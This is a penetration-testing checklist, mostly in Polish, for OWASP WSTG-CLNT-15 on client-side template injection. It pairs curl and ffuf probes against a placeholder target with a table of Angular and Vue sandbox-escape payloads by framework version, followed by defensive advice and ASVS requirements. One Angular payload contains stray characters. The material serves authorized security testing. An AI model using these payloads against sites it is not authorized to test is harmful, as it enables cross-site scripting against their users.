# WSTG-CLNT-15 — Testing for Client-side Template Injection (CSTI)

## Cele

- Identify the client-side framework and its version
- Detect injection points where user input is reflected into DOM and processed by template engine
- Assess if injection allows arbitrary JavaScript execution (XSS)

## KOMENDY

### Identyfikacja frameworka

```bash
curl -s "https://TARGET/" | grep -i "angular\|vue\|react\|ember\|knockout\|handlebars"

```

### Testowanie CSTI - Angular

```bash
curl -s "https://TARGET/page?input={{constructor.constructor('alert(1)')()**}}"
curl -s "https://TARGET/page?input={{7*7}}" | grep "49"

```

### Vue.js

```bash
curl -s "https://TARGET/page?input={{_c.constructor('alert(1)')()}}"

```

### Testowanie polyglot CSTI

```bash
curl -s "https://TARGET/page?input=\${7*7}{{7*7}}<%= 7*7 %>"

```

## KOMENDY Z WORDLISTAMI

### SecLists template engines

```bash
ffuf -u "https://TARGET/page?input=FUZZ" -w Desktop/WSTG/SecLists-master/Fuzzing/template-engines-expression.txt -mc all -o output_ffuf_csti.json

ffuf -u "https://TARGET/page?input=FUZZ" -w Desktop/WSTG/SecLists-master/Fuzzing/template-engines-special-vars.txt -mc all -o output_ffuf_csti_vars.json

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Zidentyfikuj framework JS i jego wersje (Wappalyzer, whatweb)
2. Wstaw {{7*7}} i sprawdz czy wynik to 49 w przegladarce
3. Testuj payloady specyficzne dla frameworka (Angular, Vue)
4. Sprawdz CSP - CSTI wymaga unsafe-eval do eksploitacji w nowszych frameworkach
5. Testuj sandbox bypass dla danej wersji frameworka


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — Third_Party_Javascript_Management_Cheat_Sheet.md, DOM_based_XSS_Prevention_Cheat_Sheet.md

### CSTI — Client-Side Template Injection

- Dane uzytkownika sa **wstawiane do szablonu client-side** (Angular, Vue, Handlebars)
- Skutek: wykonanie **JavaScript** w kontekscie strony — XSS
- Roznica vs SSTI: kod wykonywany w **przegladarce**, nie na serwerze

### Payloady per framework

| Framework | Payload | Wersja |
|-----------|---------|--------|
| AngularJS 1.x | `{{constructor.constructor('alert(1)')()}}` | < 1.6 |
| AngularJS 1.6+ | `{{$on.constructor('alert(1)')()}}` | >= 1.6 (sandbox removed) |
| Vue.js 2.x | `{{_c.constructor('alert(1)')()}}` | 2.x |
| Vue.js 3.x | Sandbox — trudniejsze do eksploitacji | 3.x |
| Handlebars | `{{#with "s" as |string|}}...{{/with}}` | Rozne |

### AngularJS sandbox escape — historia

- AngularJS 1.0-1.5: sandbox — probowal ograniczyc wykonanie kodu
- Sandbox byl **wielokrotnie obchodzony** — nowe bypass w kazdej wersji
- AngularJS 1.6+: **sandbox usuniety** — `{{constructor.constructor('alert(1)')()}}` dziala bezposrednio
- Angular (2+): nie interpretuje `{{}}` z danych uzytkownika — bezpieczne domyslnie

### Obrona

- **Nie wstawiaj danych uzytkownika** do szablonow client-side bez enkodowania
- Uzyj **CSP** z `script-src 'self'` — blokuje eval(), Function() (wymagane przez wiele exploitow CSTI)
- Aktualizuj frameworki — nowsze wersje maja lepsze zabezpieczenia
- Angular (2+) i React: domyslnie bezpieczne — enkoduja output
- Vue 3: bardziej restrykcyjny sandbox — trudniejsze do exploitacji

### Subresource Integrity (SRI) — third-party JS

- `<script src="cdn.com/lib.js" integrity="sha384-..." crossorigin="anonymous">`
- Przegladarka weryfikuje hash pliku — jesli CDN skompromitowany, plik nie zostanie zaladowany
- Pinuj wersje: `lib@1.2.3` zamiast `lib@latest`
- CSP: `require-sri-for script style` — wymuszaj SRI
- Monitoruj zmiany w third-party zasobach — supply chain attacks

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| SRI Check | Wykrywanie brakujacych atrybutow Subresource Integrity | [GitHub](https://github.com/SolomonSklash/sri-check) |

---

## Wskazówki ASVS

Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas testu.

### L2 (Standardowy)

| ID | Sekcja | Wymaganie |
|---|---|---|
| V1.3.5 | Sanitization | Verify that the application sanitizes or disables user-supplied scriptable or expression template language content, such as Markdown, CSS or XSL stylesheets, BBCode, or similar. |
| V1.3.7 | Sanitization | Verify that the application protects against template injection attacks by not allowing templates to be built based on untrusted input. Where there is no alternative, any untrusted input being included dynamically during template creation must be sanitized or strictly validated. |
